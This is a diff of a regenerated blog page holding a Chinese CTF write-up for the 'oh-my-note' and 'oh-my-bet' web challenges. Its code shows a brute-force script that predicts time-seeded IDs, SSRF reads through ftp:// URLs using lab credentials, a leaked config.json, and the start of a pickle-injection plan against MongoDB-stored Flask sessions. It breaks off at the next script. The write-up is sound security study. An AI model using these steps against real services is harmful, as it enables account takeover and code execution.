@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -60,7 +60,7 @@
         "description": "oh-my-note 网站的功能有登录用户发表note、查看公开note和note_id，然后就无了。 评论的输入框都……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  2697 ,
+        "wordCount":  2695 ,
         "image": "https://tyskill.github.io/icons/favicon.ico",
         "author": {
             "@type": "Person",
@@ -244,7 +244,7 @@
     
     
         
-        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2697</span>
+        <span class="post-meta-item wordcount"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M497.9 142.1l-46.1 46.1c-4.7 4.7-12.3 4.7-17 0l-111-111c-4.7-4.7-4.7-12.3 0-17l46.1-46.1c18.7-18.7 49.1-18.7 67.9 0l60.1 60.1c18.8 18.7 18.8 49.1 0 67.9zM284.2 99.8L21.6 362.4.4 483.9c-2.9 16.4 11.4 30.6 27.8 27.8l121.5-21.3 262.6-262.6c4.7-4.7 4.7-12.3 0-17l-111-111c-4.8-4.7-12.4-4.7-17.1 0zM124.1 339.9c-5.5-5.5-5.5-14.3 0-19.8l154-154c5.5-5.5 14.3-5.5 19.8 0s5.5 14.3 0 19.8l-154 154c-5.5 5.5-14.3 5.5-19.8 0zM88 424h48v36.3l-64.5 11.3-31.1-31.1L51.7 376H88v48z"/></svg>&nbsp;2695</span>
     
     
         
@@ -275,10 +275,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
-<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
-<span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>note_id生成需要借助user_id：</p>
 <div class="highlight"><div class="chroma">
@@ -289,11 +289,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
-<span class="n">post_at</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">tz</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M UTC&#39;</span><span class="p">)</span>
-<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
-<span class="n">note_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">post_at</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">tz</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M UTC&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">note_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>此时seed的格式是<code>user_id+2021-01-15 10:29 UTC</code>。</p>
 <p>Trick：</p>
@@ -335,34 +335,34 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-coding-*-: utf-8</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">random</span>
-<span class="kn">import</span> <span class="nn">string</span>
-<span class="kn">import</span> <span class="nn">datetime</span>
-
-<span class="n">post_at</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 02:29 UTC&#34;</span>
-
-<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
-    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
-    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
-
-<span class="n">users</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="o">/</span> <span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span>
-<span class="k">for</span> <span class="n">second</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
-    <span class="n">dt</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 10:29:</span><span class="si">{}</span><span class="s2"> UTC&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">second</span><span class="p">)</span> <span class="c1"># datetime.timezone.utc有时差</span>
-    <span class="n">timeArray</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">dt</span><span class="p">,</span> <span class="s2">&#34;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S UTC&#34;</span><span class="p">)</span> <span class="c1"># 转换成时间数组</span>
-    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">timeArray</span><span class="p">)</span> <span class="c1"># 转换成时间戳</span>
-    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
-        <span class="c1"># 获得user_id</span>
-        <span class="n">seed</span> <span class="o">=</span> <span class="n">timestamp</span> <span class="o">+</span> <span class="n">user</span>
-        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
-        <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
-        <span class="c1"># 获得note_id</span>
-        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">get_random_id</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#34;</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="c1"># 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
-            <span class="n">exit</span><span class="p">()</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*-coding-*-: utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">post_at</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 02:29 UTC&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="o">/</span> <span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">second</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dt</span> <span class="o">=</span> <span class="s2">&#34;2021-01-15 10:29:</span><span class="si">{}</span><span class="s2"> UTC&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">second</span><span class="p">)</span> <span class="c1"># datetime.timezone.utc有时差</span>
+</span></span><span class="line"><span class="cl">    <span class="n">timeArray</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">dt</span><span class="p">,</span> <span class="s2">&#34;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S UTC&#34;</span><span class="p">)</span> <span class="c1"># 转换成时间数组</span>
+</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">timeArray</span><span class="p">)</span> <span class="c1"># 转换成时间戳</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 获得user_id</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seed</span> <span class="o">=</span> <span class="n">timestamp</span> <span class="o">+</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl">        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 获得note_id</span>
+</span></span><span class="line"><span class="cl">        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">get_random_id</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span> <span class="c1"># 7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="oh-my-bet"><a href="#oh-my-bet" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:oh-my-bet" class="headings">oh-my-bet</a></h2>
 <blockquote>
@@ -375,8 +375,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">app</span><span class="o">:</span><span class="nx">x</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">101</span><span class="o">:</span><span class="nx">Linux</span> <span class="nx">User</span><span class="p">,,,</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">app</span><span class="o">:/</span><span class="nx">bin</span><span class="o">/</span><span class="k">false</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">app</span><span class="o">:</span><span class="nx">x</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">101</span><span class="o">:</span><span class="nx">Linux</span> <span class="nx">User</span><span class="p">,,,</span><span class="o">:/</span><span class="nx">home</span><span class="o">/</span><span class="nx">app</span><span class="o">:/</span><span class="nx">bin</span><span class="o">/</span><span class="k">false</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>知道目录，接着就可以读源码了，源码中使用了ftp协议接收内网文件</p>
 <div class="highlight"><div class="chroma">
@@ -398,22 +398,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">ftp_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-    <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">()</span>
-    <span class="n">ftp</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;172.20.0.2&#34;</span><span class="p">,</span> <span class="mi">8877</span><span class="p">)</span>
-    <span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;fan&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">ftp</span>
-
-<span class="k">def</span> <span class="nf">callback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
-    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
-    
-<span class="k">def</span> <span class="nf">get_config</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-    <span class="n">f</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ftp_login</span><span class="p">()</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s2">&#34;files&#34;</span><span class="p">)</span>
-    <span class="n">buf_size</span> <span class="o">=</span> <span class="mi">1024</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s1">&#39;RETR </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;config.json&#39;</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">callback</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ftp_login</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ftp</span> <span class="o">=</span> <span class="n">FTP</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ftp</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&#34;172.20.0.2&#34;</span><span class="p">,</span> <span class="mi">8877</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;fan&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ftp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">callback</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_config</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ftp_login</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">cwd</span><span class="p">(</span><span class="s2">&#34;files&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf_size</span> <span class="o">=</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s1">&#39;RETR </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;config.json&#39;</span><span class="p">),</span> <span class="bp">self</span><span class="o">.</span><span class="n">callback</span><span class="p">,</span> <span class="n">buf_size</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>通过<code>ftp://fan:root@172.20.0.2:8877/</code>列举文件，然后<code>ftp://fan:root@172.20.0.2:8877/files/config.json</code>读取config.json和ftp-server.py</p>
 <p>config.json</p>
@@ -436,22 +436,22 @@
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span>
-  <span class="nt">&#34;secret_key&#34;</span><span class="p">:</span><span class="s2">&#34;f4545478ee86$%^&amp;&amp;%$#&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;DEBUG&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;mongodb&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;REMOTE_MONGO_IP&#34;</span><span class="p">:</span> <span class="s2">&#34;172.20.0.5&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;REMOTE_MONGO_PORT&#34;</span><span class="p">:</span> <span class="mi">27017</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_MONGODB_DB&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_MONGODB_COLLECT&#34;</span><span class="p">:</span> <span class="s2">&#34;sessions&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_PERMANENT&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_USE_SIGNER&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
-  <span class="nt">&#34;SESSION_KEY_PREFIX&#34;</span><span class="p">:</span> <span class="s2">&#34;session:&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;SQLALCHEMY_DATABASE_URI&#34;</span><span class="p">:</span> <span class="s2">&#34;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&#34;</span><span class="p">,</span>
-  <span class="nt">&#34;SQLALCHEMY_TRACK_MODIFICATIONS&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
-  <span class="nt">&#34;REDIS_URL&#34;</span><span class="p">:</span> <span class="s2">&#34;redis://@172.20.0.4:6379/0&#34;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;secret_key&#34;</span><span class="p">:</span><span class="s2">&#34;f4545478ee86$%^&amp;&amp;%$#&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;DEBUG&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;mongodb&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;REMOTE_MONGO_IP&#34;</span><span class="p">:</span> <span class="s2">&#34;172.20.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;REMOTE_MONGO_PORT&#34;</span><span class="p">:</span> <span class="mi">27017</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_MONGODB_DB&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_MONGODB_COLLECT&#34;</span><span class="p">:</span> <span class="s2">&#34;sessions&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_PERMANENT&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_USE_SIGNER&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SESSION_KEY_PREFIX&#34;</span><span class="p">:</span> <span class="s2">&#34;session:&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SQLALCHEMY_DATABASE_URI&#34;</span><span class="p">:</span> <span class="s2">&#34;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;SQLALCHEMY_TRACK_MODIFICATIONS&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;REDIS_URL&#34;</span><span class="p">:</span> <span class="s2">&#34;redis://@172.20.0.4:6379/0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>题目提示不需要打redis，mongodb存session，mysql不知道干啥，思路就清晰了：<strong>修改session数据</strong>。</p>
 <p>查看一下flask_session中对mongodb存储session使用<code>pickle</code>序列化数据，所以接下来就是如何插入pickle数据的问题。</p>
@@ -482,15 +482,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="s1">&#39;&#39;&#39;添加内容
-</span><span class="s1">if b&#34;session:&#34; in msg:
-</span><span class="s1">    e = Exception()
-</span><span class="s1">    e.message = msg
-</span><span class="s1">    raise e
-</span><span class="s1">&#39;&#39;&#39;</span>
-<span class="k">try</span><span class="p">:</span>
-    <span class="o">...</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;添加内容
+</span></span></span><span class="line"><span class="cl"><span class="s1">if b&#34;session:&#34; in msg:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    e = Exception()
+</span></span></span><span class="line"><span class="cl"><span class="s1">    e.message = msg
+</span></span></span><span class="line"><span class="cl"><span class="s1">    raise e
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>本地起个mongodb，跑一下下面的脚本获得数据包：</p>
 <p>mongo.py</p>
@@ -523,32 +523,32 @@
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*-author-*-: frankli</span>
-<span class="kn">from</span> <span class="nn">pymongo</span> <span class="kn">import</span> <span class="n">MongoClient</span>
